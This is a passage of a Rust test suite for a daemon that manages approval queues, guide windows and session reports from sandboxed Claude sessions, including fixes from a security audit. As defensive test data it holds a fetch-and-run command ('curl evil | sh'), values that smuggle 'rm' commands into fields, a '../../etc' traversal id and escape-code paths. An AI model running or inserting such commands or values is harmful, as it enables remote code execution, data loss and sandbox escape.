fn an_answered_request_in_the_queue_is_skipped() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    fs::write(bench.fixture.answers("runs").join(format!("{RUN_B}.result")), "{}").unwrap();
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "");
}

#[test]
fn a_request_naming_no_answers_folder_never_shows() {
    // Security audit M3: its answer would have nowhere to go but a folder every sandbox reads.
    let mut bench = Bench::new();
    fs::write(cockpit::approval::held_request(RUN_A, "request"), "{}").unwrap();
    bench.registry.run_request(RUN_A).unwrap();
    assert!(started_sessions(&bench).is_empty());
    assert_eq!(bench.registry.runs.current, "");
}

#[test]
fn a_guide_naming_no_answers_folder_never_opens() {
    let mut bench = Bench::new();
    fs::write(cockpit::approval::held_request(RUN_A, "guide"), "{}").unwrap();
    bench.registry.guide_request(RUN_A).unwrap();
    assert!(bench.windows().is_empty());
}

/// The heartbeat ask-to-run keeps while it waits, last touched `seconds_ago`.
fn heartbeat(bench: &Bench, id: &str, seconds_ago: u64) {
    let path = bench.fixture.queue().join(format!("{id}.waiting"));
    fs::write(&path, "").unwrap();
    let touched = std::time::SystemTime::now() - std::time::Duration::from_secs(seconds_ago);
    fs::File::options().write(true).open(&path).unwrap().set_modified(touched).unwrap();
}

fn result_status(bench: &Bench, id: &str) -> Option<String> {
    let text = fs::read_to_string(bench.fixture.answers("runs").join(format!("{id}.result"))).ok()?;
    serde_json::from_str::<Value>(&text).ok()?["status"].as_str().map(str::to_string)
}

#[test]
fn an_approval_nobody_waits_for_any_more_is_dropped_and_the_next_starts() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    heartbeat(&bench, RUN_B, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    heartbeat(&bench, RUN_A, 600);
    bench.registry.tick_queues();
    assert_eq!(result_status(&bench, RUN_A).as_deref(), Some("abandoned"));
    assert!(bench.commands().contains(&vec!["tmux".to_string(), "kill-session".into(), "-t".into(), format!("=claude-run-{RUN_A}")]));
    assert!(bench.windows()[0].borrow().closed);
    assert_eq!(bench.registry.runs.current, RUN_B);
}

#[test]
fn an_approval_whose_asker_still_waits_stays() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    bench.registry.run_request(RUN_A).unwrap();
    heartbeat(&bench, RUN_A, 120);
    bench.registry.tick_queues();
    assert_eq!(bench.registry.runs.current, RUN_A);
    assert_eq!(result_status(&bench, RUN_A), None);
}

#[test]
fn a_running_command_is_never_dropped() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    heartbeat(&bench, RUN_A, 600);
    bench.registry.tick_queues();
    assert_eq!(bench.registry.runs.running, [RUN_A]);
    assert_eq!(result_status(&bench, RUN_A), None, "dropped while it runs");
}

#[test]
fn the_next_request_shows_while_an_approved_command_runs() {
    // Parallel sessions, a project's parallel clones too: a long command does not hold the others back.
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    assert_eq!((bench.registry.runs.current.as_str(), bench.registry.runs.running.as_slice()), (RUN_B, &[RUN_A.to_string()][..]));
    assert_eq!(started_sessions(&bench), ["claude-run-aaaaaaaaaaaa", "claude-run-bbbbbbbbbbbb"]);
}

#[test]
fn a_running_command_that_asks_for_input_waits_for_the_approval_on_screen() {
    // Theo answers one thing at a time: the command waiting for its sudo password comes next.
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(bench.registry.runs.current, RUN_B);
    bench.registry.run_phase(RUN_B, "done");
    assert_eq!((bench.registry.runs.current.as_str(), bench.registry.runs.phase.as_str()), (RUN_A, "input"));
}

#[test]
fn a_command_that_ends_while_running_on_closes_its_own_pane() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "done");
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()]));
    assert!(bench.registry.runs.running.is_empty());
    assert_eq!(bench.registry.runs.current, RUN_B);
}

#[test]
fn a_queued_request_nobody_waits_for_is_skipped() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    heartbeat(&bench, RUN_B, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    heartbeat(&bench, RUN_B, 600);
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "");
    assert_eq!(result_status(&bench, RUN_B).as_deref(), Some("abandoned"));
    assert!(bench.commands().contains(&vec!["tmux".to_string(), "kill-session".into(), "-t".into(), format!("=claude-run-{RUN_B}")]));
    assert!(bench.commands().contains(&vec!["cockpit".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
}

#[test]
fn a_request_without_a_heartbeat_counts_from_its_filing() {
    let mut bench = Bench::new();
    fs::write(cockpit::approval::held_request(RUN_A, "request"), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.tick_queues();
    assert_eq!(bench.registry.runs.current, RUN_A, "a fresh request is not dropped for lack of a heartbeat");
}

#[test]
fn the_window_opens_while_it_needs_theo_off_the_cockpit() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    assert_eq!(bench.windows()[0].borrow().command.last().unwrap(), "=claude-run-aaaaaaaaaaaa");
}

#[test]
fn the_window_closes_once_the_command_runs() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.tick_queues();
    assert!(bench.windows()[0].borrow().closed);
    assert_eq!(bench.windows().len(), 1, "none opens while it just runs");
}

#[test]
fn the_window_comes_back_when_the_command_asks_for_input() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(bench.windows().len(), 2);
    assert!(!bench.windows()[1].borrow().closed);
}

#[test]
fn after_an_answer_the_window_stays_until_the_command_ends() {
    // Typing "y" at an install prompt closed it at once: Theo lost what the answer did.
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    assert!(!bench.windows()[1].borrow().closed);
    bench.registry.run_phase(RUN_A, "done");
    assert!(bench.windows()[1].borrow().closed);
}

#[test]
fn a_window_theo_closes_stays_closed_while_it_asks() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.windows()[0].borrow_mut().closed = true;
    bench.registry.tick_queues();
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 1, "reopened after Theo closed it");
}

#[test]
fn a_window_theo_closed_comes_back_for_the_next_question() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.windows()[0].borrow_mut().closed = true;
    bench.registry.tick_queues();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(bench.windows().len(), 2);
    assert!(!bench.windows()[1].borrow().closed);
}

#[test]
fn after_an_answer_a_window_closed_on_the_cockpit_does_not_follow_theo_elsewhere() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    bench.world.borrow_mut().on_cockpit = true;
    bench.registry.tick_queues();
    bench.world.borrow_mut().on_cockpit = false;
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 2, "reopened on the next workspace");
    assert!(bench.windows()[1].borrow().closed);
}

#[test]
fn a_command_that_never_asks_for_input_runs_without_its_window() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    assert!(bench.windows()[0].borrow().closed);
}

#[test]
fn input_asked_during_a_game_opens_no_window() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.world.borrow_mut().gaming = true;
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 1);
}

#[test]
fn no_window_on_the_cockpit() {
    let mut bench = Bench::with(Fixture::new(), World { on_cockpit: true, ..World::default() });
    bench.registry.run_request(RUN_A).unwrap();
    assert!(bench.windows().is_empty());
}

#[test]
fn no_window_while_gaming() {
    let mut bench = Bench::with(Fixture::new(), World { gaming: true, ..World::default() });
    bench.registry.run_request(RUN_A).unwrap();
    assert!(bench.windows().is_empty());
}

// ---- The guide queue ----

#[test]
fn a_bad_guide_id_is_refused() {
    let mut bench = Bench::new();
    assert!(bench.registry.guide_request("../../etc").is_err());
}

#[test]
fn a_guide_opens_in_a_floating_window_of_its_own_one_at_a_time() {
    let mut bench = Bench::new();
    bench.registry.guide_request(RUN_A).unwrap();
    bench.registry.guide_request(RUN_B).unwrap();
    let windows = bench.windows();
    assert_eq!(windows.len(), 1);
    let command = windows[0].borrow().command.clone();
    assert_eq!(command[..3], ["kitty", "--class", "cockpit-guide"]);
    assert_eq!(command.last().unwrap(), RUN_A);
}

#[test]
fn while_gaming_the_guide_waits_then_opens() {
    let mut bench = Bench::with(Fixture::new(), World { gaming: true, ..World::default() });
    bench.registry.guide_request(RUN_A).unwrap();
    bench.registry.tick_queues();
    assert!(bench.windows().is_empty());
    assert!(bench.raised().is_empty());
    bench.world.borrow_mut().gaming = false;
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 1);
}

#[test]
fn closing_the_guide_window_tells_claude_where_theo_stopped_and_opens_the_next() {
    let mut bench = Bench::new();
    bench.registry.guide_request(RUN_A).unwrap();
    bench.registry.guide_request(RUN_B).unwrap();
    fs::write(bench.fixture.answers("guides").join(format!("{RUN_A}.progress")), json!({"step": 2, "total": 5, "done": 1}).to_string()).unwrap();
    bench.windows()[0].borrow_mut().closed = true;
    bench.registry.tick_queues();
    let result: Value = serde_json::from_str(&fs::read_to_string(bench.fixture.answers("guides").join(format!("{RUN_A}.result"))).unwrap()).unwrap();
    assert_eq!((result["status"].as_str(), result["step"].as_i64(), result["total"].as_i64()), (Some("closed"), Some(2), Some(5)));
    assert!(bench.dropped().contains(&format!("notice:guide-{RUN_A}")));
    assert_eq!(bench.registry.guides.current, RUN_B);
    assert_eq!(bench.windows()[1].borrow().command.last().unwrap(), RUN_B);
}

#[test]
fn a_project_name_with_escape_codes_is_not_taken() {
    let mut bench = Bench::new();
    let folder = bench.fixture.root.join("evil");
    fs::create_dir_all(bench.fixture.root.join("store/x\x1b[8my/.git")).unwrap();
    fs::create_dir_all(&folder).unwrap();
    fs::write(folder.join(".git"), format!("gitdir: {}\n", bench.fixture.root.join("store/x\x1b[8my/.git").display())).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": folder.to_string_lossy(), "project": "evil"}));
    assert_eq!(bench.snapshot()[0]["project"], "evil");
}

// ---- Reports through the socket: the sender decides the pane ----

/// A process tree with namespaces: (pid, parent, namespace, environment).
struct Tree(Vec<(&'static str, Option<&'static str>, &'static str, HashMap<String, String>)>);

struct TimedTree { tree: Tree, start: String, boot: String }

impl Processes for TimedTree {
    fn pids(&self) -> Vec<String> { self.tree.pids() }
    fn comm(&self, pid: &str) -> String { self.tree.comm(pid) }
    fn command(&self, pid: &str) -> Vec<String> { self.tree.command(pid) }
    fn environment(&self, pid: &str) -> HashMap<String, String> { self.tree.environment(pid) }
    fn parent(&self, pid: &str) -> Option<String> { self.tree.parent(pid) }
    fn pid_namespace(&self, pid: &str) -> Option<String> { self.tree.pid_namespace(pid) }
    fn start_time(&self, _: &str) -> Option<String> { Some(self.start.clone()) }
    fn boot_id(&self) -> Option<String> { Some(self.boot.clone()) }
}

#[test]
fn team_runtime_proof_changes_when_a_launcher_pid_is_reused_or_the_machine_reboots() {
    let mut tree = TimedTree { tree:Tree(vec![("50",Some("30"),"sandbox",environment(&[])),("30",None,"host",environment(&[]))]),
        start:"1000".into(),boot:"boot-a".into() };
    let original = trusted_runtime(&tree, "50").unwrap();
    assert!(runtime_is_live(&tree, &original));
    tree.start = "1001".into();
    assert!(!runtime_is_live(&tree, &original));
    assert_ne!(trusted_runtime(&tree, "50").unwrap(), original);
    tree.start = "1000".into();
    tree.boot = "boot-b".into();
    assert!(!runtime_is_live(&tree, &original));
}

#[test]
fn host_processes_cannot_claim_to_be_agent_transport_peers() {
    let tree = TimedTree { tree:Tree(vec![("30",None,"host",environment(&[]))]),start:"1000".into(),boot:"boot-a".into() };
    assert_eq!(trusted_runtime(&tree, "30"), None);
}

#[test]
fn process_start_time_parsing_handles_parentheses_and_spaces_in_the_command_name() {
    let stat = format!("50 (a command ) name) S {} 9876 0", (4..=21).map(|number| number.to_string()).collect::<Vec<_>>().join(" "));
    assert_eq!(parse_process_start_time(&stat), Some("9876".into()));
    assert_eq!(parse_process_start_time("not a stat record"), None);
}

impl Processes for Tree {
    fn pids(&self) -> Vec<String> { self.0.iter().map(|row| row.0.to_string()).collect() }
    fn comm(&self, _: &str) -> String { String::new() }
    fn command(&self, _: &str) -> Vec<String> { Vec::new() }
    fn environment(&self, pid: &str) -> HashMap<String, String> {
        self.0.iter().find(|row| row.0 == pid).map(|row| row.3.clone()).unwrap_or_default()
    }
    fn parent(&self, pid: &str) -> Option<String> {
        self.0.iter().find(|row| row.0 == pid).and_then(|row| row.1).map(str::to_string)
    }
    fn pid_namespace(&self, pid: &str) -> Option<String> {
        if pid == "self" { return Some("host".into()) }
        self.0.iter().find(|row| row.0 == pid).map(|row| row.2.to_string())
    }
}

fn environment(pairs: &[(&str, &str)]) -> HashMap<String, String> {
    pairs.iter().map(|(name, value)| (name.to_string(), value.to_string())).collect()
}

#[test]
fn the_pane_comes_from_the_first_process_outside_the_sandbox() {
    // socat (in the sandbox, forging TMUX_PANE) <- hook <- bwrap (outside, the launcher's pane).
    let tree = Tree(vec![
        ("50", Some("40"), "sandbox", environment(&[("TMUX_PANE", "%1")])),
        ("40", Some("30"), "sandbox", environment(&[("TMUX_PANE", "%1")])),
        ("30", Some("20"), "host", environment(&[("TMUX_PANE", "%7"), ("KITTY_PID", "4242")])),
        ("20", None, "host", environment(&[])),
    ]);
    assert_eq!(trusted_target(&tree, "50"), Some(target(&[("tmux_pane", "%7"), ("kitty_pid", "4242")])));
}

#[test]
fn subscription_generations_ignore_the_sandbox_environment() {
    for host_generation in ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "", "BAD", "../generation"] {
        let tree = Tree(vec![
            ("50", Some("30"), "sandbox", environment(&[("COCKPIT_SUBSCRIPTION_ROUTE", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")])),
            ("30", None, "host", environment(&[("COCKPIT_SUBSCRIPTION_ROUTE", host_generation)])),
        ]);
        let expected = (host_generation.len() == 32).then(|| host_generation.to_string());
        assert_eq!(trusted_subscription_token(&tree, "50"), expected);
    }
}

#[test]
fn a_sender_with_no_process_outside_the_sandbox_is_not_placed() {
    let tree = Tree(vec![("50", Some("40"), "sandbox", environment(&[])), ("40", None, "sandbox", environment(&[]))]);
    assert_eq!(trusted_target(&tree, "50"), None);
}

#[test]
fn a_report_gets_its_senders_pane_not_the_one_it_claims() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "working", "tmux_pane": "%1"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].target.get("tmux_pane").map(String::as_str), Some("%7"));
}

#[test]
fn a_waiting_session_gaining_its_senders_pane_publishes_the_target() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[]));
    let report = || parse_session(&json!({"session": SESSION_A, "project": "p", "state": "waiting"}).to_string()).unwrap();
    bench.registry.report_from(report(), 500).unwrap();
    assert!(bench.snapshot()[0].get("tmux_pane").is_none());
    let since = bench.registry.sessions[SESSION_A].since;

    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    bench.registry.report_from(report(), 500).unwrap();

    let row = &bench.snapshot()[0];
    assert_eq!(row["tmux_pane"], "%7");
    assert_eq!(row["state"], "waiting");
    assert_eq!(bench.registry.sessions[SESSION_A].since, since);
}

#[test]
fn a_session_cannot_be_moved_off_a_pane_where_it_still_runs() {
    // Another sandbox reporting the dotfiles session's id from its own pane would take its card.
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(500, target(&[("tmux_pane", "%1")]));
        world.sender_targets.insert(600, target(&[("tmux_pane", "%9")]));
        world.claude_panes = set(&["%1", "%9"]);
    }
    let report = |state: &str| parse_session(&json!({"session": SESSION_A, "project": "p", "state": state}).to_string()).unwrap();
    bench.registry.report_from(report("waiting"), 500).unwrap();
    assert!(bench.registry.report_from(report("needs-you"), 600).is_err());
    let entry = &bench.registry.sessions[SESSION_A];
    assert_eq!((entry.target.get("tmux_pane").map(String::as_str), entry.state.as_str()), (Some("%1"), "waiting"));
}

#[test]
fn a_report_from_an_unplaceable_sender_is_refused() {
    let mut bench = Bench::new();
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "working"}).to_string()).unwrap();
    assert!(bench.registry.report_from(report, 777).is_err());
    assert!(bench.registry.sessions.is_empty());
}

#[test]
fn a_session_theo_looked_at_loses_its_sticky_banner() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Claude is waiting for your input", "sticky": true}));
    bench.report(SESSION_B, json!({"state": "waiting", "message": "Claude is waiting for your input", "sticky": true}));
    bench.registry.seen(SESSION_A);
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
    assert!(!bench.dropped().contains(&SESSION_B.to_string()), "only the session looked at");
}

#[test]
fn seen_ignores_what_is_not_a_session_id() {
    let mut bench = Bench::new();
    bench.registry.seen("notice:budget");
    assert!(bench.dropped().is_empty());
}

#[test]
fn a_terminal_session_is_marked_in_the_snapshot_and_the_reboot_record() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/a", "terminal": true}));
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_B, json!({"state": "waiting", "cwd": "/b"}));
    let terminal: Vec<bool> = [SESSION_A, SESSION_B].iter()
        .map(|id| bench.snapshot().iter().find(|row| row["session"] == *id).unwrap()["terminal"].as_bool().unwrap()).collect();
    assert_eq!(terminal, [true, false], "a later report without the flag keeps it");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[SESSION_A]["terminal"], true);
}

#[test]
fn a_credits_session_is_marked_in_the_snapshot_and_the_reboot_record_until_it_switches_back() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/a", "credits": true}));
    bench.report(SESSION_A, json!({"state": "working"}));
    let credits = |bench: &Bench| bench.snapshot().iter().find(|row| row["session"] == SESSION_A).unwrap()["credits"].clone();
    assert_eq!(credits(&bench), true, "a report without the field keeps it");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[SESSION_A]["credits"], true);
    bench.report(SESSION_A, json!({"state": "waiting", "credits": false}));
    assert_eq!(credits(&bench), false);
}

#[test]
fn unpushed_commits_are_counted_and_cleared_by_a_push() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/r/dotfiles", "unpushed": 3}));
    bench.report(SESSION_A, json!({"state": "working"}));
    let unpushed = |bench: &Bench| bench.snapshot()[0]["unpushed"].as_u64().unwrap();
    assert_eq!(unpushed(&bench), 3, "a report without a count keeps the last one");
    bench.registry.pushed("/r/elsewhere");
    assert_eq!(unpushed(&bench), 3);
    bench.registry.pushed("/r/dotfiles");
    assert_eq!(unpushed(&bench), 0);
}

#[test]
fn an_unpushed_count_must_be_a_count() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "unpushed": "3; rm"}).to_string()).is_err());
}

#[test]
fn background_counts_last_until_a_report_says_otherwise() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "agents": 2, "background": 1}));
    bench.report(SESSION_A, json!({"state": "working"}));
    let counts = |bench: &Bench| { let row = &bench.snapshot()[0]; (row["agents"].as_u64().unwrap(), row["background"].as_u64().unwrap()) };
    assert_eq!(counts(&bench), (2, 1), "a report without counts keeps the last ones");
    bench.report(SESSION_A, json!({"state": "waiting", "agents": 0, "background": 0}));
    assert_eq!(counts(&bench), (0, 0));
}

#[test]
fn background_counts_must_be_counts() {
    for key in ["agents", "background"] {
        assert!(parse_session(&json!({"session": SESSION_A, "project": "p", key: "2; rm"}).to_string()).is_err(), "{key}");
    }
}

#[test]
fn a_session_says_which_craft_apps_it_drives() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "apps": "figcraft:on"}));
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert_eq!(bench.snapshot()[0]["apps"], "figcraft:on", "a report without the field keeps it");
    bench.report(SESSION_A, json!({"state": "working", "apps": ""}));
    assert_eq!(bench.snapshot()[0]["apps"], "");
}

#[test]
fn an_apps_field_that_is_not_a_list_of_apps_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "apps": "figcraft:on; rm -rf"}).to_string()).is_err());
}

#[test]
fn a_reported_folder_gives_way_to_the_one_its_sandbox_started_in() {
    // Security audit M1: a restart would resume the session in the claimed folder's sandbox.
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
        world.sender_directories.insert(500, "/home/theo/IdeaProjects/opusline".into());
    }
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "waiting", "cwd": "/home/theo/IdeaProjects/dotfiles"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].cwd, "/home/theo/IdeaProjects/opusline");
}

#[test]
fn a_session_whose_sandbox_folder_is_unknown_gets_no_folder() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "state": "waiting", "cwd": "/home/theo/IdeaProjects/dotfiles"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].cwd, "");
}

#[test]
fn the_sandbox_folder_is_where_the_first_process_outside_it_runs() {
    struct Folders(Tree);
    impl Processes for Folders {
        fn pids(&self) -> Vec<String> { self.0.pids() }
        fn comm(&self, pid: &str) -> String { self.0.comm(pid) }
        fn command(&self, pid: &str) -> Vec<String> { self.0.command(pid) }
        fn environment(&self, pid: &str) -> HashMap<String, String> { self.0.environment(pid) }
        fn parent(&self, pid: &str) -> Option<String> { self.0.parent(pid) }
        fn pid_namespace(&self, pid: &str) -> Option<String> { self.0.pid_namespace(pid) }
        fn cwd(&self, pid: &str) -> Option<String> { Some(format!("/folder-of-{pid}")) }
    }
    let tree = Folders(Tree(vec![
        ("50", Some("40"), "sandbox", environment(&[])),
        ("40", Some("30"), "sandbox", environment(&[])),
        ("30", Some("20"), "host", environment(&[])),
        ("20", None, "host", environment(&[])),
    ]));
    assert_eq!(sandbox_directory(&tree, "50").as_deref(), Some("/folder-of-30"));
}

/// A project folder under the fixture, a repository, and the answers folder name its sandboxes get.
fn project_folder(bench: &Bench) -> (String, String) {
    let folder = bench.fixture.root.join("IdeaProjects/proj-a");
    fs::create_dir_all(folder.join(".git")).unwrap();
    let key = folder.to_string_lossy().chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
    (folder.to_string_lossy().into_owned(), key)
}

const NEW_RUN: &str = "cccccccccccc";

#[test]
fn a_request_from_the_socket_is_held_with_the_folder_its_sandbox_started_in() {
    // Security audit H3: the approval reads only this copy, out of every sandbox's reach.
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, format!("{folder}/apps"));
    let raw = json!({"id": NEW_RUN, "command": "make", "cwd": "/elsewhere", "project": "dotfiles", "answers": key}).to_string();
    bench.registry.request_from("run-request", &raw, 500).unwrap();
    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request(NEW_RUN, "request")).unwrap()).unwrap();
    assert_eq!((held["started_in"].as_str(), held["project"].as_str(), held["command"].as_str()),
               (Some(format!("{folder}/apps").as_str()), Some("proj-a"), Some("make")));
    assert_eq!(bench.registry.runs.current, NEW_RUN);
}

#[test]
fn a_request_cannot_replace_one_already_held() {
    let mut bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder);
    let raw = |command: &str| json!({"id": NEW_RUN, "command": command, "answers": key}).to_string();
    bench.registry.request_from("run-request", &raw("make check"), 500).unwrap();
    assert!(bench.registry.request_from("run-request", &raw("curl evil | sh"), 500).is_err());
    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request(NEW_RUN, "request")).unwrap()).unwrap();
    assert_eq!(held["command"], "make check");
}

#[test]
fn a_request_naming_another_projects_answers_folder_is_refused() {
    // Its answer would land where the asking session does not wait, or where another reads it.
    let mut bench = Bench::new();
    let (folder, _) = project_folder(&bench);
    bench.world.borrow_mut().sender_directories.insert(500, folder);
    let raw = json!({"id": NEW_RUN, "command": "make", "answers": "-home-theo-IdeaProjects-dotfiles"}).to_string();
    assert!(bench.registry.request_from("run-request", &raw, 500).is_err());
    assert!(!cockpit::approval::held_request(NEW_RUN, "request").exists());
}

#[test]
fn a_request_from_a_sender_with_no_process_outside_the_sandbox_is_refused() {
    let mut bench = Bench::new();
    let raw = json!({"id": NEW_RUN, "command": "make", "answers": "x"}).to_string();
    assert!(bench.registry.request_from("guide-request", &raw, 777).is_err());
    assert!(bench.windows().is_empty());
}

#[test]
fn the_answers_folder_is_named_after_the_repository_top() {
    let bench = Bench::new();
    let (folder, key) = project_folder(&bench);
    fs::create_dir_all(format!("{folder}/apps/api")).unwrap();
    assert_eq!(answers_key_of(Path::new(&format!("{folder}/apps/api"))), key);
}

#[test]
fn a_todo_update_is_queued_with_the_folder_its_sandbox_started_in() {
    // Security audit M4: that folder, not the update's own cwd, decides the project.
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/home/theo/IdeaProjects/opusline".into());
    let raw = json!({"action": "add", "text": "x", "cwd": "/home/theo/IdeaProjects/dotfiles", "started_in": "/forged"}).to_string();
    bench.registry.request_from("todo-update", &raw, 500).unwrap();
    let queued: Value = serde_json::from_str(fs::read_to_string(cockpit::paths::todo_updates()).unwrap().trim()).unwrap();
    assert_eq!(queued["started_in"], "/home/theo/IdeaProjects/opusline");
}

#[test]
fn a_todo_sender_cannot_forge_host_approval_or_a_receipt_destination() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/r/greywall".into());
    let raw = json!({"action": "add", "text": "Deploy", "request_id": "abcdef123456",
                     "host_approved": true, "receipt_key": "another-project"}).to_string();
    bench.registry.request_from("todo-update", &raw, 500).unwrap();
    let queued: Value = serde_json::from_str(fs::read_to_string(cockpit::paths::todo_updates()).unwrap().trim()).unwrap();
    assert_ne!(queued["host_approved"], true);
    assert_eq!(queued["receipt_key"], "-r-greywall");
    let held: Value = serde_json::from_str(&fs::read_to_string(cockpit::approval::held_request("abcdef123456", "todo")).unwrap()).unwrap();
    assert_eq!(held, queued);
}

#[test]
fn report_filings_use_daemon_verified_receipts_for_success_and_open_caps() {
    for action in ["blocked", "stack"] {
        let mut bench = Bench::new();
        let (folder, key) = project_folder(&bench);
        bench.world.borrow_mut().sender_directories.insert(500, folder.clone());
        fs::create_dir_all(cockpit::paths::greyproxy_work().join(".git")).unwrap();
        let mut todos = cockpit::todo::TodoList::load();
        for number in 0..4 {
            let id = format!("{number:012x}");
            let raw = json!({"action": action, "repo": "greyproxy", "text": format!("Work {number}"), "why": "Broken",
                             "request_id": id, "host_approved": true, "receipt_key": "another-project"}).to_string();
            bench.registry.request_from("todo-update", &raw, 500).unwrap();
            let should_save = number < 3;
            assert_eq!(todos.apply_updates(), usize::from(should_save));
            let path = cockpit::approval::answers_dir(&key, "todos").join(format!("{id}.json"));
            let receipt = cockpit::util::read_json(&path).unwrap();
            assert_eq!(receipt["outcome"], if should_save { "accepted" } else { "rejected" });
            assert_eq!(receipt["can_approve"], false);
            if should_save {
                assert!(cockpit::todo::TodoList::load().items.iter().any(|item| receipt["id"] == item.id()));
            } else {
                assert!(receipt["reason"].as_str().unwrap().contains("3 already open"));
            }
            assert!(!cockpit::approval::answers_dir("another-project", "todos").join(format!("{id}.json")).exists());
        }
    }
}

#[test]
fn todo_retention_uses_the_daemons_clock_not_the_senders() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_directories.insert(500, "/r/greywall".into());
